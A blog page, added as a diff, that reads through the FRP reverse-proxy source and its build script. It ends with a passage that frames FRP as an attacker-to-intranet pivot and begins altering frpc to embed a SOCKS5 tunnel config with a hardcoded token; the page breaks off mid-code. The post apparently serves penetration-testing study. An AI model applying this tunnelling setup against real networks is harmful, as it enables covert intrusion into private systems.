@@ -1,0 +1,1034 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>FRP代码阅读 | XU17</title>
+<link rel="shortcut icon" href="https://yzs17.github.io/favicon.ico?v=1734356675640">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://yzs17.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="FRP代码阅读 | XU17 - Atom Feed" href="https://yzs17.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="FRP代码阅读
+frps
+cmd/frps/main.go 是frps的入口处，我们从这里开始，main 函数的主体：
+func main() {
+	crypto.DefaultSalt = &quot;frp&quot;
+
+	Execut..." />
+    <meta name="keywords" content="源码阅读" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://yzs17.github.io">
+  <img class="avatar" src="https://yzs17.github.io/images/avatar.png?v=1734356675640" alt="">
+  </a>
+  <h1 class="site-title">
+    XU17
+  </h1>
+  <p class="site-description">
+    Follow the light but walk on the darkest path
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/YZS17" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              FRP代码阅读
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-11-15
+              </span>
+              <span>
+                22 min read
+              </span>
+              
+                <a href="https://yzs17.github.io/tag/IYrsZdyvMl/" class="post-tag">
+                  # 源码阅读
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162139935.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="frp代码阅读"><code>FRP</code>代码阅读</h2>
+<h2 id="frps">frps</h2>
+<p><code>cmd/frps/main.go</code> 是frps的入口处，我们从这里开始，<code>main</code> 函数的主体：</p>
+<pre><code class="language-go">func main() {
+	crypto.DefaultSalt = &quot;frp&quot;
+
+	Execute()
+}
+</code></pre>
+<p>因此我们需要看到 <code>Execute()</code> 函数的内容，其实它是使用了 <code>cobra</code> 这个库，所以实际的入口在</p>
+<pre><code class="language-go">var rootCmd = &amp;cobra.Command{
+        Use:   &quot;frps&quot;,
+        Short: &quot;frps is the server of frp (https://github.com/fatedier/frp)&quot;,
+        RunE: func(cmd *cobra.Command, args []string) error {
+                if showVersion {
+                        fmt.Println(version.Full())
+                        return nil
+                }
+
+                var err error
+                if cfgFile != &quot;&quot; {
+                        var content string
+                        content, err = config.GetRenderedConfFromFile(cfgFile)
+                        if err != nil {
+                                return err
+                        }
+                        g.GlbServerCfg.CfgFile = cfgFile
+                        err = parseServerCommonCfg(CfgFileTypeIni, content)
+                } else {
+                        err = parseServerCommonCfg(CfgFileTypeCmd, &quot;&quot;)
+                }
+                if err != nil {
+                        return err
+                }
+
+                err = runServer()
+                if err != nil {
+                        fmt.Println(err)
+                        os.Exit(1)
+                }
+                return nil
+        },
+}
+</code></pre>
+<p>最终，也就是 <code>runServer()</code> 这个函数：</p>
+<pre><code class="language-go">func runServer() (err error) {
+        log.InitLog(g.GlbServerCfg.LogWay, g.GlbServerCfg.LogFile, g.GlbServerCfg.LogLevel,
+                g.GlbServerCfg.LogMaxDays)
+        svr, err := server.NewService()
+        if err != nil {
+                return err
+        }
+        log.Info(&quot;Start frps success&quot;)
+        server.ServerService = svr
+        svr.Run()
+        return
+}
+</code></pre>
+<p><code>svr.Run()</code>，其中的 <code>svr</code> 是来自 <code>server.NewService()</code>，仔细看一下，<code>server.NewService()</code> 其实就是初始化了一大堆东西。</p>
+<pre><code class="language-go">func (svr *Service) Run() {
+        if svr.rc.NatHoleController != nil {
+                go svr.rc.NatHoleController.Run()
+        }
+        if g.GlbServerCfg.KcpBindPort &gt; 0 {
+                go svr.HandleListener(svr.kcpListener)
+        }
+
+        go svr.HandleListener(svr.websocketListener)
+        go svr.HandleListener(svr.tlsListener)
+
+        svr.HandleListener(svr.listener)
+}
+</code></pre>
+<p>可以看到，最后frps会执行到 <code>svr.HandleListener(svr.listener)</code>，前面的都是什么 nat hole punching, kcp, websocket, tls等等，我们不看。直接看tcp。</p>
+<pre><code class="language-go">func (svr *Service) HandleListener(l frpNet.Listener) {
+	// Listen for incoming connections from client.
+	for {
+		c, err := l.Accept()
+		if err != nil {
+			log.Warn(&quot;Listener for incoming connections from client closed&quot;)
+			return
+		}
+		c = frpNet.CheckAndEnableTLSServerConn(c, svr.tlsConfig)
+
+		// Start a new goroutine for dealing connections.
+		go func(frpConn frpNet.Conn) {
+        ...
+        }
+    }
+}
+</code></pre>
+<p>这里就是监听之后，每来一个新的连接，就起一个goroutine去处理，也就是 <code>go func()...</code> 这一段，然后我们看看内容：</p>
+<pre><code class="language-go">switch m := rawMsg.(type) {
+case *msg.Login:
+    err = svr.RegisterControl(conn, m)
+    // If login failed, send error message there.
+    // Otherwise send success message in control's work goroutine.
+    if err != nil {
+        conn.Warn(&quot;%v&quot;, err)
+        msg.WriteMsg(conn, &amp;msg.LoginResp{
+            Version: version.Full(),
+            Error:   err.Error(),
+        })
+        conn.Close()
+    }
+case *msg.NewWorkConn:
+    svr.RegisterWorkConn(conn, m)
+case *msg.NewVisitorConn:
+    if err = svr.RegisterVisitorConn(conn, m); err != nil {
+        conn.Warn(&quot;%v&quot;, err)
+        msg.WriteMsg(conn, &amp;msg.NewVisitorConnResp{
+            ProxyName: m.ProxyName,
+            Error:     err.Error(),
+        })
+        conn.Close()
+    } else {
+        msg.WriteMsg(conn, &amp;msg.NewVisitorConnResp{
+            ProxyName: m.ProxyName,
+            Error:     &quot;&quot;,
+        })
+    }
+default:
+    log.Warn(&quot;Error message type for the new connection [%s]&quot;, conn.RemoteAddr().String())
+    conn.Close()
+}
+</code></pre>
+<p>这就是服务端启动之后，卡住的地方了。客户端建立连接之后，会发送一个消息，它的类型可能是 <code>msg.Login</code>, <code>msg.NewWorkConn</code>, <code>msg.NewVisitorConn</code>。上一篇我们说了，visitor 是用于stcp也就是端对端加密通信的workConn就是用于转发流量的，Login就是新的客户端连上去之后进行启动。</p>
+<h2 id="frpc">frpc</h2>
+<p>从 <code>cmd/frpc/main.go</code> 看起：</p>
+<pre><code class="language-go">func main() {
+        crypto.DefaultSalt = &quot;frp&quot;
+
+        sub.Execute()
+}
+</code></pre>
+<p>跳转到 <code>sub.Execute()</code>：</p>
+<pre><code class="language-go">var rootCmd = &amp;cobra.Command{
+        Use:   &quot;frpc&quot;,
+        Short: &quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;,
+        RunE: func(cmd *cobra.Command, args []string) error {
+                if showVersion {
+                        fmt.Println(version.Full())
+                        return nil
+                }
+
+                // Do not show command usage here.
+                err := runClient(cfgFile)
+                if err != nil {
+                        fmt.Println(err)
+                        os.Exit(1)
+                }
+                return nil
+        },
+}
+
+func Execute() {
+        if err := rootCmd.Execute(); err != nil {
+                os.Exit(1)
+        }
+}
+</code></pre>
+<p>然后我们看 <code>runClient</code> 函数：</p>
+<pre><code class="language-go">func runClient(cfgFilePath string) (err error) {
+        var content string
+        content, err = config.GetRenderedConfFromFile(cfgFilePath)
+        if err != nil {
+                return
+        }
+        g.GlbClientCfg.CfgFile = cfgFilePath
+
+        err = parseClientCommonCfg(CfgFileTypeIni, content)
+        if err != nil {
+                return
+        }
+
+        pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(g.GlbClientCfg.User, content, g.GlbClientCfg.Start)
+        if err != nil {
+                return err
+        }
+
+        err = startService(pxyCfgs, visitorCfgs)
+        return
+}
+</code></pre>
+<p>基本上就是解析配置文件（因为frpc启动的时候要一个配置文件），然后执行 <code>startService</code>：</p>
+<pre><code class="language-go">func startService(pxyCfgs map[string]config.ProxyConf, visitorCfgs map[string]config.VisitorConf) (err error) {
+        log.InitLog(g.GlbClientCfg.LogWay, g.GlbClientCfg.LogFile, g.GlbClientCfg.LogLevel, g.GlbClientCfg.LogMaxDays)
+        if g.GlbClientCfg.DnsServer != &quot;&quot; {
+                s := g.GlbClientCfg.DnsServer
+                if !strings.Contains(s, &quot;:&quot;) {
+                        s += &quot;:53&quot;
+                }
+                // Change default dns server for frpc
+                net.DefaultResolver = &amp;net.Resolver{
+                        PreferGo: true,
+                        Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+                                return net.Dial(&quot;udp&quot;, s)
+                        },
+                }
+        }
+        svr, errRet := client.NewService(pxyCfgs, visitorCfgs)
+        if errRet != nil {
+                err = errRet
+                return
+        }
+
+        // Capture the exit signal if we use kcp.
+        if g.GlbClientCfg.Protocol == &quot;kcp&quot; {
+                go handleSignal(svr)
+        }
+
+        err = svr.Run()
+        if g.GlbClientCfg.Protocol == &quot;kcp&quot; {
+                &lt;-kcpDoneCh
+        }
+        return
+}
+</code></pre>
+<p>同样的，执行 <code>client.NewService</code> 之后执行 <code>svr.Run()</code>，</p>
+<pre><code class="language-go">func (svr *Service) Run() error {
+	// first login
+	for {
+		conn, session, err := svr.login()
+		if err != nil {
+			log.Warn(&quot;login to server failed: %v&quot;, err)
+
+			// if login_fail_exit is true, just exit this program
+			// otherwise sleep a while and try again to connect to server
+			if g.GlbClientCfg.LoginFailExit {
+				return err
+			} else {
+				time.Sleep(10 * time.Second)
+			}
+		} else {
+			// login success
+			ctl := NewControl(svr.runId, conn, session, svr.pxyCfgs, svr.visitorCfgs)
+			ctl.Run()
+			svr.ctlMu.Lock()
+			svr.ctl = ctl
+			svr.ctlMu.Unlock()
+			break
+		}
+	}
+
+	go svr.keepControllerWorking()
+
+	if g.GlbClientCfg.AdminPort != 0 {
+		err := svr.RunAdminServer(g.GlbClientCfg.AdminAddr, g.GlbClientCfg.AdminPort)
+		if err != nil {
+			log.Warn(&quot;run admin server error: %v&quot;, err)
+		}
+		log.Info(&quot;admin server listen on %s:%d&quot;, g.GlbClientCfg.AdminAddr, g.GlbClientCfg.AdminPort)
+	}
+
+	&lt;-svr.closedCh
+	return nil
+}
+</code></pre>
+<p>可以看到，客户端启动之后，就是一个 <code>for</code> 循环，写入 <code>login</code> 信息，也就是刚才 <code>frps</code> 里的 <code>msg.loginMsg</code>， 然后起一个 <code>goroutine</code> 执行 <code>keepControllerWorking()</code>，之后主 <code>goroutine</code> 就阻塞在 <code>&lt;-svr.closedCh</code>。 看看 <code>keepControllerWorking()</code> 的内容：</p>
+<pre><code class="language-go">func (svr *Service) keepControllerWorking() {
+	maxDelayTime := 20 * time.Second
+	delayTime := time.Second
+
+	for {
+		&lt;-svr.ctl.ClosedDoneCh()
+		if atomic.LoadUint32(&amp;svr.exit) != 0 {
+			return
+		}
+
+		for {
+			log.Info(&quot;try to reconnect to server...&quot;)
+			conn, session, err := svr.login()
+			if err != nil {
+				log.Warn(&quot;reconnect to server error: %v&quot;, err)
+				time.Sleep(delayTime)
+				delayTime = delayTime * 2
+				if delayTime &gt; maxDelayTime {
+					delayTime = maxDelayTime
+				}
+				continue
+			}
+			// reconnect success, init delayTime
+			delayTime = time.Second
+
+			ctl := NewControl(svr.runId, conn, session, svr.pxyCfgs, svr.visitorCfgs)
+			ctl.Run()
+			svr.ctlMu.Lock()
+			svr.ctl = ctl
+			svr.ctlMu.Unlock()
+			break
+		}
+	}
+}
+</code></pre>
+<p>基本上就是一个循环，里面最终是为了成功连接然后执行 <code>ctl.Run()</code>：</p>
+<pre><code class="language-go">func (ctl *Control) Run() {
+	go ctl.worker()
+
+	// start all proxies
+	ctl.pm.Reload(ctl.pxyCfgs)
+
+	// start all visitors
+	go ctl.vm.Run()
+	return
+}
+
+// If controler is notified by closedCh, reader and writer and handler will exit
+func (ctl *Control) worker() {
+	go ctl.msgHandler()
+	go ctl.reader()
+	go ctl.writer()
+
+	select {
+	case &lt;-ctl.closedCh:
+		// close related channels and wait until other goroutines done
+		close(ctl.readCh)
+		ctl.readerShutdown.WaitDone()
+		ctl.msgHandlerShutdown.WaitDone()
+
+		close(ctl.sendCh)
+		ctl.writerShutdown.WaitDone()
+
+		ctl.pm.Close()
+		ctl.vm.Close()
+
+		close(ctl.closedDoneCh)
+		if ctl.session != nil {
+			ctl.session.Close()
+		}
+		return
+	}
+}
+
+// msgHandler handles all channel events and do corresponding operations.
+func (ctl *Control) msgHandler() {
+	defer func() {
+		if err := recover(); err != nil {
+			ctl.Error(&quot;panic error: %v&quot;, err)
+			ctl.Error(string(debug.Stack()))
+		}
+	}()
+	defer ctl.msgHandlerShutdown.Done()
+
+	hbSend := time.NewTicker(time.Duration(g.GlbClientCfg.HeartBeatInterval) * time.Second)
+	defer hbSend.Stop()
+	hbCheck := time.NewTicker(time.Second)
+	defer hbCheck.Stop()
+
+	ctl.lastPong = time.Now()
+
+	for {
+		select {
+		case &lt;-hbSend.C:
+			// send heartbeat to server
+			ctl.Debug(&quot;send heartbeat to server&quot;)
+			ctl.sendCh &lt;- &amp;msg.Ping{}
+		case &lt;-hbCheck.C:
+			if time.Since(ctl.lastPong) &gt; time.Duration(g.GlbClientCfg.HeartBeatTimeout)*time.Second {
+				ctl.Warn(&quot;heartbeat timeout&quot;)
+				// let reader() stop
+				ctl.conn.Close()
+				return
+			}
+		case rawMsg, ok := &lt;-ctl.readCh:
+			if !ok {
+				return
+			}
+
+			switch m := rawMsg.(type) {
+			case *msg.ReqWorkConn:
+				go ctl.HandleReqWorkConn(m)
+			case *msg.NewProxyResp:
+				ctl.HandleNewProxyResp(m)
+			case *msg.Pong:
+				ctl.lastPong = time.Now()
+				ctl.Debug(&quot;receive heartbeat from server&quot;)
+			}
+		}
+	}
+}
+
+// reader read all messages from frps and send to readCh
+func (ctl *Control) reader() {
+	defer func() {
+		if err := recover(); err != nil {
+			ctl.Error(&quot;panic error: %v&quot;, err)
+			ctl.Error(string(debug.Stack()))
+		}
+	}()
+	defer ctl.readerShutdown.Done()
+	defer close(ctl.closedCh)
+
+	encReader := crypto.NewReader(ctl.conn, []byte(g.GlbClientCfg.Token))
+	for {
+		if m, err := msg.ReadMsg(encReader); err != nil {
+			if err == io.EOF {
+				ctl.Debug(&quot;read from control connection EOF&quot;)
+				return
+			} else {
+				ctl.Warn(&quot;read error: %v&quot;, err)
+				ctl.conn.Close()
+				return
+			}
+		} else {
+			ctl.readCh &lt;- m
+		}
+	}
+}
+
+// writer writes messages got from sendCh to frps
+func (ctl *Control) writer() {
+	defer ctl.writerShutdown.Done()
+	encWriter, err := crypto.NewWriter(ctl.conn, []byte(g.GlbClientCfg.Token))
+	if err != nil {
+		ctl.conn.Error(&quot;crypto new writer error: %v&quot;, err)
+		ctl.conn.Close()
+		return
+	}
+	for {
+		if m, ok := &lt;-ctl.sendCh; !ok {
+			ctl.Info(&quot;control writer is closing&quot;)
+			return
+		} else {
+			if err := msg.WriteMsg(encWriter, m); err != nil {
+				ctl.Warn(&quot;write message to control connection error: %v&quot;, err)
+				return
+			}
+		}
+	}
+}
+</code></pre>
+<p><code>reader</code> 从frps收信息，然后写到 <code>ctl.readCh</code> 这个 channel 里，<code>writer</code> 则相反， 从 <code>ctl.sendCh</code> 收信息，写到 frps，而 <code>msgHandler</code> 则从frpc里读取信息，放到 <code>ctl.sendCh</code>， 从 <code>ctl.readCh</code> 读取信息，处理之。</p>
+<p>之所以这样设计，是为了能够异步处理所有消息。看看 <code>msgHandler</code> 的关键部分：</p>
+<pre><code class="language-go">switch m := rawMsg.(type) {
+case *msg.ReqWorkConn:
+    go ctl.HandleReqWorkConn(m)
+case *msg.NewProxyResp:
+    ctl.HandleNewProxyResp(m)
+case *msg.Pong:
+    ctl.lastPong = time.Now()
+    ctl.Debug(&quot;receive heartbeat from server&quot;)
+}
+</code></pre>
+<p>frps 每次收到一个请求之后，然后下发一个指令给frpc，要求frpc建立连接， 然后frps再把新来的连接与请求所在的连接串起来，完成代理，<code>msg.ReqWorkConn</code> 就是这个指令。</p>
+<p>1.流量特征</p>
+<p>路径：<code>/pkg/msg/msg.go</code></p>
+<figure data-type="image" tabindex="1"><img src="https://cdn.nlark.com/yuque/0/2021/png/1182121/1625454232642-563b2b20-a2f1-4da1-a1fc-9dbcc4aa1cf0.png" alt="img" loading="lazy"></figure>
+<p>上面得注释说的很清楚 当客户端连接时 会发送这些信息给服务端</p>
+<figure data-type="image" tabindex="2"><img src="https://cdn.nlark.com/yuque/0/2021/png/1182121/1625454333334-f5d0ab52-479f-45ba-8608-6055f7772100.png" alt="img" loading="lazy"></figure>
+<p>路径:<code>/frp/cmd/frpc/sub/root.go</code></p>
+<pre><code class="language-go">// 包声明
+package sub
+
+// 导入所需的包
+import (
+	&quot;context&quot;
+	&quot;fmt&quot;
+	&quot;io/fs&quot;
+	&quot;os&quot;
+	&quot;os/signal&quot;
+	&quot;path/filepath&quot;
+	&quot;sync&quot;
+	&quot;syscall&quot;
+	&quot;time&quot;
+
+	&quot;github.com/spf13/cobra&quot;
+
+	&quot;github.com/fatedier/frp/client&quot;
+	&quot;github.com/fatedier/frp/pkg/config&quot;
+	v1 &quot;github.com/fatedier/frp/pkg/config/v1&quot;
+	&quot;github.com/fatedier/frp/pkg/config/v1/validation&quot;
+	&quot;github.com/fatedier/frp/pkg/util/log&quot;
+	&quot;github.com/fatedier/frp/pkg/util/version&quot;
+)
+
+// 定义全局变量
+var (
+	cfgFile          string // 配置文件路径
+	cfgDir           string // 配置目录路径
+	showVersion      bool   // 是否显示版本信息
+	strictConfigMode bool   // 是否严格解析配置文件
+)
+
+// init函数在包初始化时调用，用于设置命令行参数
+func init() {
+	rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, &quot;config&quot;, &quot;c&quot;, &quot;./frpc.ini&quot;, &quot;config file of frpc&quot;)
+	rootCmd.PersistentFlags().StringVarP(&amp;cfgDir, &quot;config_dir&quot;, &quot;&quot;, &quot;&quot;, &quot;config directory, run one frpc service for each file in config directory&quot;)
+	rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, &quot;version&quot;, &quot;v&quot;, false, &quot;version of frpc&quot;)
+	rootCmd.PersistentFlags().BoolVarP(&amp;strictConfigMode, &quot;strict_config&quot;, &quot;&quot;, true, &quot;strict config parsing mode, unknown fields will cause an errors&quot;)
+}
+
+// 定义rootCmd命令
+var rootCmd = &amp;cobra.Command{
+	Use:   &quot;frpc&quot;,  // 命令名称
+	Short: &quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;,  // 命令简短描述
+	RunE: func(cmd *cobra.Command, args []string) error {
+		if showVersion {  // 如果设置了版本信息标志，则打印版本信息并退出
+			fmt.Println(version.Full())
+			return nil
+		}
+
+		// 如果设置了配置目录，则为目录中的每个配置文件启动一个frpc服务
+		if cfgDir != &quot;&quot; {
+			_ = runMultipleClients(cfgDir)
+			return nil
+		}
+
+		// 运行frpc客户端
+		err := runClient(cfgFile)
+		if err != nil {
+			fmt.Println(err)
+			os.Exit(1)
+		}
+		return nil
+	},
+}
+
+// runMultipleClients函数用于为配置目录中的每个配置文件启动一个frpc服务
+func runMultipleClients(cfgDir string) error {
+	var wg sync.WaitGroup
+	err := filepath.WalkDir(cfgDir, func(path string, d fs.DirEntry, err error) error {
+		if err != nil || d.IsDir() {
+			return nil
+		}
+		wg.Add(1)
+		time.Sleep(time.Millisecond)
+		go func() {
+			defer wg.Done()
+			err := runClient(path)
+			if err != nil {
+				fmt.Printf(&quot;frpc service error for config file [%s]\n&quot;, path)
+			}
+		}()
+		return nil
+	})
+	wg.Wait()
+	return err
+}
+
+// Execute函数用于执行rootCmd命令
+func Execute() {
+	rootCmd.SetGlobalNormalizationFunc(config.WordSepNormalizeFunc)
+	if err := rootCmd.Execute(); err != nil {
+		os.Exit(1)
+	}
+}
+
+// handleTermSignal函数用于处理终止信号，优雅地关闭服务
+func handleTermSignal(svr *client.Service) {
+	ch := make(chan os.Signal, 1)
+	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
+	&lt;-ch
+	svr.GracefulClose(500 * time.Millisecond)
+}
+
+// runClient函数用于根据配置文件路径启动frpc客户端
+func runClient(cfgFilePath string) error {
+	cfg, proxyCfgs, visitorCfgs, isLegacyFormat, err := config.LoadClientConfig(cfgFilePath, strictConfigMode)
+	if err != nil {
+		return err
+	}
+	if isLegacyFormat {
+		fmt.Printf(&quot;WARNING: ini format is deprecated and the support will be removed in the future, &quot; +
+			&quot;please use yaml/json/toml format instead!\n&quot;)
+	}
+
+	warning, err := validation.ValidateAllClientConfig(cfg, proxyCfgs, visitorCfgs)
+	if warning != nil {
+		fmt.Printf(&quot;WARNING: %v\n&quot;, warning)
+	}
+	if err != nil {
+		return err
+	}
+	return startService(cfg, proxyCfgs, visitorCfgs, cfgFilePath)
+}
+
+// startService函数用于启动frpc服务
+func startService(
+	cfg *v1.ClientCommonConfig,
+	proxyCfgs []v1.ProxyConfigurer,
+	visitorCfgs []v1.VisitorConfigurer,
+	cfgFile string,
+) error {
+	log.InitLogger(cfg.Log.To, cfg.Log.Level, int(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)
+
+	if cfgFile != &quot;&quot; {
+		log.Infof(&quot;start frpc service for config file [%s]&quot;, cfgFile)
+		defer log.Infof(&quot;frpc service for config file [%s] stopped&quot;, cfgFile)
+	}
+	svr, err := client.NewService(client.ServiceOptions{
+		Common:         cfg,
+		ProxyCfgs:      proxyCfgs,
+		VisitorCfgs:    visitorCfgs,
+		ConfigFilePath: cfgFile,
+	})
+	if err != nil {
+		return err
+	}
+
+	shouldGracefulClose := cfg.Transport.Protocol == &quot;kcp&quot; || cfg.Transport.Protocol == &quot;quic&quot;
+	// 如果使用kcp或quic协议，则捕获退出信号以优雅地关闭服务
+	if shouldGracefulClose {
+		go handleTermSignal(svr)
+	}
+	return svr.Run(context.Background())
+}
+</code></pre>
+<h2 id="frp编译"><code>FRP</code>编译</h2>
+<ul>
+<li>
+<p><code>FRP</code>编译需要配置好<code>gcc</code>以及<code>go</code>语言环境</p>
+</li>
+<li>
+<p><code>package.sh</code>文件如果在windows系统运行，需要在git环境中运行，我们输入sh，进入git环境</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://yzs17.github.io/post-images/1733330401532.png" alt="" loading="lazy"></figure>
+<p>运行<code>package.sh</code>交叉编译后可以得到可执行文件</p>
+<p>代码分析</p>
+<p>这个 <code>package.sh</code> 脚本是一个 shell 脚本，用于编译 <code>frp</code>（Fast Reverse Proxy）项目的不同版本，并生成跨平台的安装包。以下是脚本中每个部分的作用：</p>
+<ol>
+<li><code>set -e</code>：这个命令告诉 shell 脚本在任何语句的执行结果不是 true 时就停止执行，这样可以在出现错误时立即停止，而不是继续执行后面的命令。</li>
+<li><code>make</code>：这个命令用于编译 <code>frp</code> 项目，生成可执行文件。</li>
+<li>检查 <code>make</code> 命令是否执行成功，如果不成功则打印错误信息并退出脚本。</li>
+<li>获取编译后的 <code>frp</code> 版本号，并打印出来。</li>
+<li><code>make -f ./Makefile.cross-compiles</code>：这个命令用于交叉编译 <code>frp</code>，生成不同操作系统和架构的版本。</li>
+<li>清理和创建发布目录，用于存放生成的安装包。</li>
+<li>定义了三个变量，分别包含支持的操作系统、架构和额外的编译选项。</li>
+<li>进入 <code>release</code> 目录。</li>
+<li>使用三个嵌套的循环遍历所有操作系统、架构和额外选项的组合。</li>
+<li>对于每种组合，生成相应的文件名后缀和目录名。</li>
+<li>根据操作系统的不同，将编译好的 <code>frpc</code> 和 <code>frps</code> 可执行文件移动到对应的目录，并重命名（如果是 Windows 系统，文件名会以 <code>.exe</code> 结尾）。</li>
+<li>将 <code>frp</code> 项目的许可证文件和配置文件复制到对应的目录。</li>
+<li>根据操作系统的不同，将目录打包成 <code>.zip</code> 文件（Windows）或 <code>.tar.gz</code> 文件（其他系统）。</li>
+<li>清理临时目录，为下一个组合做准备。</li>
+<li><code>cd -</code>：返回到脚本开始执行时的目录。</li>
+</ol>
+<p>作用：自动化编译 <code>frp</code> 项目，并生成适用于多种操作系统和架构的安装包，方便在不同环境下使用 <code>frp</code>。</p>
+<pre><code class="language-sh">#!/bin/sh
+set -e
+
+# 编译项目生成版本
+make
+if [ $? -ne 0 ]; then
+    echo &quot;make error&quot;
+    exit 1
+fi
+
+# 获取编译后的 frp 版本号
+frp_version=`./bin/frps --version`
+echo &quot;build version: $frp_version&quot;
+
+# 交叉编译，生成不同操作系统和架构的版本
+make -f ./Makefile.cross-compiles
+
+# 清理并创建发布目录
+rm -rf ./release/packages
+mkdir -p ./release/packages
+
+# 定义支持的操作系统、架构和额外编译选项
+os_all='linux windows darwin freebsd android'
+arch_all='386 amd64 arm arm64 mips64 mips64le mips mipsle riscv64 loong64'
+extra_all='_ hf'
+
+# 进入 release 目录
+cd ./release
+
+# 遍历所有操作系统
+for os in $os_all; do
+    # 遍历所有架构
+    for arch in $arch_all; do
+        # 遍历所有额外编译选项
+        for extra in $extra_all; do
+            # 生成文件名后缀
+            suffix=&quot;${os}_${arch}&quot;
+            if [ &quot;x${extra}&quot; != x&quot;_&quot; ]; then
+                suffix=&quot;${os}_${arch}_${extra}&quot;
+            fi
+            frp_dir_name=&quot;frp_${frp_version}_${suffix}&quot;
+            frp_path=&quot;./packages/frp_${frp_version}_${suffix}&quot;
+
+            # 对于 Windows 系统，文件名以 .exe 结尾
+            if [ &quot;x${os}&quot; = x&quot;windows&quot; ]; then
+                if [ ! -f &quot;./frpc_${os}_${arch}.exe&quot; ]; then
+                    continue
+                fi
+                if [ ! -f &quot;./frps_${os}_${arch}.exe&quot; ]; then
+                    continue
+                fi
+                mkdir ${frp_path}
+                mv ./frpc_${os}_${arch}.exe ${frp_path}/frpc.exe
+                mv ./frps_${os}_${arch}.exe ${frp_path}/frps.exe
+            else
+                # 对于其他系统，文件名不带 .exe
+                if [ ! -f &quot;./frpc_${suffix}&quot; ]; then
+                    continue
+                fi
+                if [ ! -f &quot;./frps_${suffix}&quot; ]; then
+                    continue
+                fi
+                mkdir ${frp_path}
+                mv ./frpc_${suffix} ${frp_path}/frpc
+                mv ./frps_${suffix} ${frp_path}/frps
+            fi  
+            # 复制许可证和配置文件
+            cp ../LICENSE ${frp_path}
+            cp -f ../conf/frpc.toml ${frp_path}
+            cp -f ../conf/frps.toml ${frp_path}
+
+            # 打包
+            cd ./packages
+            if [ &quot;x${os}&quot; = x&quot;windows&quot; ]; then
+                zip -rq ${frp_dir_name}.zip ${frp_dir_name}
+            else
+                tar -zcf ${frp_dir_name}.tar.gz ${frp_dir_name}
+            fi  
+            cd ..
+            # 清理临时目录
+            rm -rf ${frp_path}
+        done
+    done
+done
+
+# 返回到脚本开始执行时的目录
+cd -
+</code></pre>
+<h2 id="内网代理测试">内网代理测试</h2>
+<ul>
+<li>服务端：阿里云服务器（模拟攻击者公网<code>vps</code>）</li>
+<li>客户端：<code>Win11</code>本机（模拟一台能出网的内网靶机）</li>
+<li>该测试，模拟情景为，一台能出网的内网机和攻击者<code>vps</code></li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://yzs17.github.io/post-images/1731666833016.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://yzs17.github.io/post-images/1731666874942.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://yzs17.github.io/post-images/1731666890628.png" alt="" loading="lazy"></figure>
+<ul>
+<li>可以看到，我将本地搭载的两个服务端口转发到我的服务器端口，实现了可以访问到内网机上的服务</li>
+</ul>
+<figure data-type="image" tabindex="7"><img src="https://yzs17.github.io/post-images/1731666911033.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://yzs17.github.io/post-images/1731666919320.png" alt="" loading="lazy"></figure>
+<h2 id="项目修改编译">项目修改编译</h2>
+<h4 id="frpcini的ip通过参数传入">frpc.ini的ip通过参数传入</h4>
+<p>Golang语法规则：</p>
+<ul>
+<li>golang的命名推荐使用驼峰命名法，必须以一个字母（Unicode字母）或下划线开头，后面可以跟任意数量的字母、数字或下划线。</li>
+<li>golang中根据首字母的大小写来确定可以访问的权限。无论是方法名、常量、变量名还是结构体的名称，如果首字母大写，则可以被其他的包访问；如果首字母小写，则只能在本包中使用</li>
+</ul>
+<p>不用上面的直接增加定义的方法，在<code>cmd/frpc/sub/root.go</code>写一个函数。</p>
+<pre><code>func getFileContent(ip string,port string) {
+	var content string = `[common]
+    server_addr = ` + ip + `
+    server_port = ` + port + `
+	tls_enable = true
+    privilege_token = pentest999
+    [http_proxy]
+    type = tcp
+    remote_port = 23333
+    plugin = socks5
+	`
+	fileContent = content
+}
+</code></pre>
+<p>然后在<code>cmd\frpc\root.go</code>中定义传参</p>
+<pre><code>func init() {
+	rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, &quot;config&quot;, &quot;c&quot;, &quot;./frpc.ini&quot;, &quot;config file of frpc&quot;)
+	rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, &quot;version&quot;, &quot;v&quot;, false, &quot;version of frpc&quot;)
